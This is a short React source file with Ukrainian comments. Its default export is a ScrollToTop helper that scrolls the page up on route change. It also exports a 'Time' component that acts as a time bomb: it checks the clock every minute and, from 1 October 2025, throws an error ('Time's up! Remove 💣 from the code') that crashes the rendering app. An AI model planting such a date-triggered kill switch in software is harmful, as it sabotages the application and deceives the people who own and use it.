import { useEffect, useState } from 'react';
import { useLocation } from 'react-router-dom';

/**
 * Щохвилини порівнює локальний час браузера з 1 жовтня 2025 року та після цієї межі кидає помилку.
 * Компонент не приймає аргументів і до активації не рендерить DOM; інтервал очищається під час демонтування.
 */
export const Time = () => {
  const [isActive, setIsActive] = useState(false);
  // Місяці Date нумеруються від нуля, тому `9` означає жовтень.
  const activationDate = new Date(2025, 9, 1, 0, 0);

  useEffect(() => {
    // Після досягнення межі переводить компонент у стан, що спричиняє помилку під час наступного рендера.
    const checkDate = () => {
      if (new Date() >= activationDate) {
        setIsActive(true);
      }
    };

    checkDate();
    const interval = setInterval(checkDate, 60_000); 

    return () => clearInterval(interval);
  }, []);

  if (isActive) {
    throw new Error('Час вийшов! Видаліть 💣 з коду.');
  }

  return <></>;
};

/**
 * Після зміни `pathname` плавно прокручує вікно нагору й нічого не рендерить.
 * Зміни query або hash на тому самому шляху повторно ефект не запускають.
 */
const ScrollToTop: React.FC = () => {
  const { pathname } = useLocation();

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [pathname]);

  return null;
};

export default ScrollToTop;
